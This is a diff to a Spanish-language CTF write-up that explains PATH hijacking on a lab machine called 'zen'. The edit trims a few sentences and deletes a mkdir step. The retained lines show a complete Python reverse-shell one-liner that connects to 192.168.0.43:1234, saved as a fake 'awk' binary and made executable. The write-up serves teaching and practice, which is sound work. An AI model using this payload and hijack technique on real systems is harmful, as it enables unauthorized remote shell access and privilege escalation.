@@ -208,12 +208,11 @@ hua@zen:~$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-`strace` confirma que el sistema recorre `$PATH` en orden: busca `awk` en `/usr/local/sbin` (no existe), luego en `/usr/local/bin` (no existe), luego en `/usr/sbin` (no existe) y finalmente lo encuentra en `/usr/bin`. Dado que `/usr/local/bin` no existe, podemos crearlo como directorio y colocar allí nuestro propio binario `awk` malicioso.
+`strace` confirma que el sistema recorre `$PATH` en orden: busca `awk` en `/usr/local/sbin` (no existe), luego en `/usr/local/bin` (no existe), luego en `/usr/sbin` (no existe) y finalmente lo encuentra en `/usr/bin`.
 
-Como `hua` no tiene permisos de escritura en `/usr/local/sbin`, pero sí puede escribir en `/usr/local/bin`, creamos esta última carpeta y un script malicioso con una reverse shell en Python. Usamos el payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+Como `hua` no tiene permisos de escritura en `/usr/local/sbin`, pero sí en `/usr/local/bin`, creamos en esta última carpeta un script malicioso con una reverse shell en Python. Usamos el payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 
 ```bash
-hua@zen:~$ mkdir -p /usr/local/bin
 hua@zen:~$ echo 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.43\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' > /usr/local/bin/awk
 hua@zen:~$ chmod +x /usr/local/bin/awk
 ```
